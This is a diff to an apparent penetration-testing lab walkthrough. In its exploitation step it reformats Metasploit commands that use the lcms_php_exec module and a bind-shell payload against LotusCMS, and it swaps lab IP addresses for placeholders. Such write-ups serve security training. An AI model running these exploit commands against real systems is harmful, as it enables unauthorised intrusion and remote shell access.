@@ -197,23 +197,15 @@ Step 6: Exploitation
 
 ***Setting up the options:***
 
->msfconsole
-
->search lotuscms
-
->use exploit/multi/http/lcms_php_exec
-
->show options
-
->set RHOSTS 192.168.100.80
-
->set LHOST 192.168.100.164
-
->set PAYLOAD generic/shell_bind_tcp
-
->set URI /
-
->exploit
+`msfconsole` <br>
+`search lotuscms`<br>
+`use exploit/multi/http/lcms_php_exec`<br>
+`show options`<br>
+`set RHOSTS [target-ip]`<br>
+`set LHOST [host-ip]`<br>
+`set PAYLOAD generic/shell_bind_tcp`<br>
+`set URI /`<br>
+`exploit`
 
 ![image](https://user-images.githubusercontent.com/31168741/199955556-e73a7f88-3608-4e8a-b6a2-c9b4d8b15bcf.png)
 
